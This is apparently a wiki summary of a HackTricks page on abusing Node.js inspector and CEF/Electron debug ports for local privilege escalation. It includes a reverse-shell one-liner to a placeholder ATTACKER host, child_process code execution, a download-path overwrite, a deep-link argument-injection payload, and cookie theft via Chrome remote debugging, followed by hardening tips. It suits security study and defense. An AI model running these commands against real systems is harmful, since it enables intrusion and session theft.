---
title: "HackTricks: Node Inspector / CEF Debugger Abuse"
tags: [linux-hardening, privilege-escalation, nodejs, electron, cef, debugger]
sources: [hacktricks-electron-cef-chromium-debugger-abuse.md]
updated: 2026-05-01
---

# HackTricks: Node Inspector / CEF Debugger Abuse

Source: [hacktricks-electron-cef-chromium-debugger-abuse.md](../../raw/hacktricks-electron-cef-chromium-debugger-abuse.md)

## Key Takeaways

Node.js `--inspect` and CEF/Electron `--remote-debugging-port` open a WebSocket debugger interface. Connecting to it gives **full code execution** in the context of that process. If the process runs as a more-privileged user (e.g., root, or an Electron app running as admin), connecting to the debug port is a privilege escalation. The interface binds to `127.0.0.1` by default, making it a local privesc, not a remote one.

## Attack Surface

| Runtime        | Flag                           | Default address  | Protocol                               |
| -------------- | ------------------------------ | ---------------- | -------------------------------------- |
| Node.js        | `--inspect` / `--inspect-brk`  | `127.0.0.1:9229` | Node Debug Protocol (→ RCE)            |
| Electron / CEF | `--remote-debugging-port=9222` | `127.0.0.1:9222` | Chrome DevTools Protocol (limited RCE) |

## Activating Inspector on a Running Process

```bash
kill -s SIGUSR1 <nodejs-pid>
# Inspector starts on 127.0.0.1:9229
# URL printed to process stdout: ws://127.0.0.1:9229/<UUID>
```

Useful in containers where you can't restart the process.

## RCE via Node.js Inspector

```bash
node inspect 127.0.0.1:9229
debug> exec("process.mainModule.require('child_process').exec('id > /tmp/pwn')")
```

Or use [`cefdebug`](https://github.com/taviso/cefdebug) to enumerate and exploit:

```bash
./cefdebug                              # list running inspectors
./cefdebug --url ws://127.0.0.1:3585/<UUID> --code "process.version"   # probe
./cefdebug --url ws://127.0.0.1:3585/<UUID> \
  --code "process.mainModule.require('child_process').exec('bash -i >& /dev/tcp/ATTACKER/4444 0>&1')"
```

## Chrome DevTools Protocol (CEF/Electron)

NodeJS-style `require('child_process')` RCE **does not work** via CDP. Use protocol-specific methods instead:

**File overwrite (download path hijack):**

```javascript
ws = new WebSocket("ws://127.0.0.1:9222/devtools/browser/<UUID>");
ws.send(
  JSON.stringify({
    id: 1,
    method: "Browser.setDownloadBehavior",
    params: { behavior: "allow", downloadPath: "/code/" },
  }),
);
// Then trigger download of malicious file to overwrite app source
```

**Parameter injection via deep link (CVE-2021-38112 pattern):**

If the app registers a custom URI handler and passes URI params to CEF launch args:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Injects `--gpu-launcher=calc.exe` into the CEF command line.

## SSRF Protection Bypass Note

Browsers enforce same-origin policy for the initial HTTP upgrade. Websites cannot directly reach the inspector via SSRF without DNS rebinding — `Host` header must be an IP or `localhost`. The local exploitation path (already on the machine) is not blocked by this.

## Post-Exploitation (Blue Team Abuse)

After compromising a user session, restart Chrome with debugging exposed:

```powershell
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```

Then forward port 9222 and intercept all browser activity, steal cookies/session tokens.

## Hardening

- Do not run Electron apps with `--remote-debugging-port` in production
- Deny `SIGUSR1` delivery to Node.js processes from unprivileged users
- Run Electron apps as least-privilege user, not root
- Use `--inspect=0` (random port) + firewall rules if debugging is needed

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [nodejs-security](../concepts/nodejs-security.md)
- [HackTricks](../entities/hacktricks.md)
